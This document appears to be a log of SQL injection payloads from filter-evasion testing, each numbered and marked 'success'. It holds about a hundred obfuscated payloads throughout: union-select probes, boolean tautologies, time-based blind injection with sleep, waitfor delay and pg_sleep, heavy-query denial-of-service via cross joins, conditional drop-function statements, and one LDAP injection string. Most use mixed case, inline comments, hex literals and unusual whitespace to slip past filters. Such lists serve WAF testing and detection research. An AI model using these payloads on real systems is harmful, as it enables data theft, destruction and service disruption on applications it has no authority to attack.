7 success "0x1'\x0cwhere '&0x2'='&2' "
15 success "1%' && 7394 IN (7393,7394,7395) "
20 success "0x1%'\x0c \x0b)    )    waitfor/**/delay '0:0:0x5'--\x0b"
24 success '-2378" where 0xa7e  =  2686 Or 5499 LIKE 5499--\ng~'
27 success 'iif\xa0 (  1878  =\t 0x9d1,1,1/0/**/ )   '
29 success 'eNd anD  \n (    (   (SELECT 2160)  =  2160/**/oR 8000=8001\xa0'
30 success "-0x184c'\x0bunion all/**/sELeCt/**/1462,0x5b6#\x0b"
34 success '-0x11bf" \t)  \tor 0xbde   LIKE   0xbde '
36 success '1" where 9889   like   0x26a1 '
42 success "1'||\n (  select 'svnn' froM dual WhERe/**/2535 IN (2534,2535,2536) "
50 success "-9484'\xa0or   (  0x1bd9  =  2349  )  *2349 and 'fcsa' like 'fcsa "
85 success ' SeLEct * fRom users WhERE id  =  0x1 Or (sELECt 1)#"1 union SeLeCt \'a\',version  (    ) \n -- 1 Af'
102 success "1' wHeRE 7333=7333 "
103 success '1" wHere 0xdb6  = /**/3510\xa0'
114 success "1' WHERe 5230  =  0x146e AND True "
118 success "select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' LIKE 'vcgc "
147 success '0x1"  )   As fgne wHEre \'n\' NOT LIKE \'n:\' '
152 success '1"  )   where 9962  =  9962 AND 3723 NOT LIKE 3724 and \'?#\' LIKE \'?#\'# '
154 success '1" wHeRE 7108 iN ((sELEct 7107),0x1bc4,7109) '
158 success "0x1'   )\x0c   )    as\txkiq where '(G' NOT LIKE '(G(' AND 1 and sleep  (  0x5  )  -- $"
164 success "0x1'||  (  select 'hwdj' WheRE 0x1ff3   LIKE  \n0x1ff3 "
166 success "1'||  (  select 'ymre' where 0x2288 LIKE 8840 "
181 success "1  )   OR elt  (  ']' NOT LIKE ']|',sleep  (  0x5   )    )    AnD   (  8600  =  8600 "
212 success "1'+  (  SeLEcT yjyp wHeRe 8920 LIKE 8920 oR False "
226 success "1' iN boolean mode  )\x0c  && 5725   LIKe   0x15b0#\xa0"
228 success "1' where '[$' LIKE '[$'\n"
238 success "0x1'+  (  select 'tjvt' where/**/0x99f   LIKE   (SELECT 0x99f) "
245 success "0x1'  )   AND 0x20d7   liKE     (  seleCT count  (  *  )   From generate_series  (  0x1,0x4c4b40   )  \x0b )    "
246 success 'select sleep  (  5  )   AND    (    (   0x21e7   LIKE  /**/8679 '
255 success ' seleCT * fROM users wheRe id   LIKE   \'1\' union SELeCT\x0b$["],@@VERSION -- 1\' '
258 success '1"  )   AS jqli whEre \'$\' NOT LIKE \'${\' aNd 9141=9141 AND 1 '
288 success '1%" and \'(cb\' NOT LIKE \'(cb5\' and "%"  =  " '
302 success "(SELECT 1)'||  (  select 'xugb'\nfRoM dual WHeRE 0x1a74  =  0x1a74 aND True\t"
303 success ' selecT * FRoM users WHErE id   LIKE   (SELECT 1) oR 1#"$ union SelECt \'a\',version  ( \t  )   -- 0x1 '
306 success '1"  )  \x0bwhere 0x2420\n\x0b=  0x2420 '
325 success "1',  (  SeLeCT   (  cAsE WheN\x0c  (  4209 Like 4209  )   tHEN 1 else 1/  (  selECT 0  )   EnD   )    )   \x0b"
355 success '1%"   )    )     )   Or\x0b0x1cf9   lIke     (  sELeCt count  (  *  )   FRom sysibm.systables As t1,sysibm.systables aS t2,sysibm.systables as t3  )  -- '
386 success "1   )    ) \t  as rvex wHERe 3462  =  (selECt 3462) and '1' NOT LIKE '1c'# "
387 success '0x1" wHerE\x0b\'#\n\'!=\'#\nJ\'/**/order by 1-- '
388 success '-4494 or 0x14ab  =  (SELECT 4452) '
391 success "1'||  (  select 'lljg'/*)Et6\t*/frOm/**/dual WheRE 4735=4735 And 1 "
413 success "1%'   )    )\xa0    )   order by/*gAO]*/1-- "
432 success '%2A%(SELECT\x0c0x1c)%7C%28objectclass%3D%2A%0x1d%0x1d '
433 success '-0x990%"  )   Or\n\'|OR\'\' NOT LIKE \'|OR\'&\' '
438 success "1'  )   as chla where 631 not like 632 "
448 success '1 where 6552 LIKE 6552\x0cunion all select null,null,null,null# '
459 success '-0x268f"  )   union all select 9082# '
463 success '0x1"   )    )    as nncz where \'\t|l1\' LIKE \'\t|l1\' AND 1 '
475 success '-0x60e%"   )    )\x0c    )   order/**/by 1-- '
479 success '1" \xa0)   as nyzd where \'uZ\'=\'uZ\' '
487 success "1%'  )   AnD elt  (  3962 IN (3961,3962,3963),sleep\xa0 (  (SELECT 5)   )    ) \x0c # "
493 success "1'||  (  select\t'bzxa' WhERE 0x18b0   lIKE   0x18b0 "
494 success '0x1" WhERE 7110\n  LIKE   7110/**/'
495 success "-3088' or 6872/*pXWLE*/ =  6872/**/and 'miwk'  =  'miwk "
497 success '1 wHeRE 4628 IN (4627,4628,4629) or elt  ( \x0b9503 LIKE 9503,sleep  (  5   )    )   # J'
516 success "waitfor\tdelay '(SELECT 0):0:5' and '%'  =  ' "
541 success "1  )   WHere 'C E' NOT LIKE 'C E\\' "
546 success "1%' and elt  (  0x4ba  =  0x4ba,sleep  (  0x5   )  \x0b ) \x0b  and '%'  =  ' "
563 success "-2820'   )    )    || 6679  =  8848-- "
573 success '-9496   )    )     )   Or elt  (  0x1d57   like   3951,3951  )   aND    (    (     (  3514  =  3514 AND True '
574 success "-4775'  )   Or 0xbde  =  0xbde "
575 success 'IF  (  4735  =  8907  )   sEleCT 4735 ELSe Drop function qigo--\n'
577 success "1' wHErE 4078 IN (4077,4078,4079) "
594 success "-0x19a7'   )  \x0c )   \tunion all select 0xc91# "
616 success '0x1 union/**/all\x0bsElEct null,null,null,null,null,null# '
636 success "1'||  (\x0b select 'lzzr'/**/where '0x6'\x0cNOT LIKE '6/' "
646 success 'IF  (  8284   lIKE  \t(SeLECT 6171)  )   SeleCT 8284 else/**/dRoP function mbih-- '
657 success "(SelEct 1) AnD elt  (  '~\r' LIKE '~\r',0x1c5b\x0b )   "
665 success "1  )   aS odqn WherE 0xf46   LIKE  /*'@-f~*/3910\n"
668 success '-2658  )   as casi WhEre 5320=5320 oR 3688=3689 || 0x2035  =  (SELECT 9651)-- '
673 success 'seLECT   (  case When   (  7033   likE   0x63a\x0b )   tHEn 7033 eLse (SELECT 7033)*  (  seLECt 7033 FrOm information_schema.character_sets  )   eNd  ) \n# .dx'
681 success "1'\n  )    )    and/**/7533  =  0x1d6d and    (    (   'ialm'  =  'ialm "
685 success "1%'  )   and   (  3017 NOT LIKE 3018 OR False  )  *6703/**/and   (  '%'  =  ' "
712 success "0x1'  )   aS syer wHere 3141  =  3141 rlike   (  seLEct   (  CASE When   (  6233  =  7567  )   THeN 1 elSE 0x28 End   )    )   -- "
713 success '-0x1f23   )    )\t   as armw where 1190 LIKE 1190 or make_set  (  0x248a  =  0x248a,(SELECT 0x1c11)  )\n -- '
742 success "0x1'   )    )    and 0xe7b  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'ijyi'  =  'ijyi "
754 success "-0x848'  )   oR (select 0x221e)   LIkE   8844# up"
759 success "1'||  (  select 'zyvk' from dual where '0\x0b' LIKE '0\x0b'  or  False "
777 success '1  )   Where \'"\' LIKE \'"\' '
779 success "-6527'\x0c  )    ) \t  union all SELEct\x0c0x13bd,0x13bd,0x13bd,0x13bd-- "
782 success "waitfor delay '0:0:5' AND   (  4614   lIkE   4614 "
802 success '1 where 2301  =  0x8fd '
822 success 'iif  (  0x116c  =  1610,1,(SELECT 1)/0  )   '
853 success ' ( \x0bcaSe when 8422\x0b =  0x2104 tHeN (sElECT/**/1) eLse null end  )  '
854 success "0x1'||  (  select 'kyhs' frOm dual whEre (SELECT 0x2513)\xa0\n LIkE   0x2513 "
858 success 'iif  (  4638  =  0x2042,1,(SELECT 1)/0  )   '
874 success '1%"  )   and sleep  (  0x5  )   and   (  "%" \x0b=  " '
895 success "-8521'+  (  selECt ucim WHERe 1192 LIKE 0x4a8 union/**/all SelecT/**/9003-- "
901 success "1'+  (  select 'xqjx' wheRE 7048  =  7048 aNd 9198   LikE   9198-- "
932 success '1 WheRE 0x94e  = /**/2382 '
946 success "-0x178e%'  )   || '(SELECT (SELECT 0))' NOT LIKE '0p' "
949 success '-6076"   )    )    or 0x2055  =  4757 '
963 success "(SELECT (SELECT 1))'  )   aS ibaw/**/WHERE 'Knf' NOT LIKE 'Knfc' anD 9915 IN (9914,9915,9916)-- "
992 success "-2869'/**/  )    )\x0c   union all selEcT 0xc90-- yJ"
995 success "(SELECT (SELECT 0x1))'\t )   wHErE 8931 not like 8932 "
1000 success '0x1 where/**/8398  =  8398 '
1002 success "-0xc23'  )   where 7782  =  7782 or 0x217b  =  8571-- "
1017 success '-0x234d%" union all select\x0c0x19b7# '
1018 success "-0x669' union all select\t0x12e3# "
1033 success "sElECt count  (  *  )  \tFrom sysibm.systables As t1,sysibm.systables aS t2,sysibm.systables as t3  )  +' "
1038 success "1'  )   and 0x224d<>8782 AND '|' NOT LIKE '|j' "
1047 success '1  )  \nwhere 0x17ca  = /**/6090 '
1050 success '-1203"   )    )    Or 0x217b   LIKE   (SELECT 8571)-- B'
1068 success '1"\twhere \'S~A\' LIKE \'S~A\' '
1070 success '-0xe7b"   )    )     )   or 8571   LiKe   0x217b/*zEP*/anD\xa0True aNd \'CcY\' NOT\xa0LIKE \'CcY8\'-- '
1073 success "-1587'  )   OR 0x2093 \x0c=  0x15a4 "
1074 success "1'  ) \t As bzem wHere '(' LIKE '(' OR False "
1078 success '1  )   WHEre 4780   LiKe   0x12ac OR\tFalse aND 1 '
1101 success '-7466 wherE\x0c5161  =  0x1429 or 1446 IN (1445,1446,1447) '
1102 success '1" and elt \t(  9940 NOT LIKE 9941,sleep  (  5   )    )    '
1109 success '1"   )    )    OR 0x1090  =    (  SELecT 0x1090 frOm pg_sleep  (  0x5   )    )   -- ^'
1123 success "-1602' OR 3038  =  0xbde "
1143 success 'iif  (  0x4c1   LIKE/**/  8831,1,1/0x0\n )   '
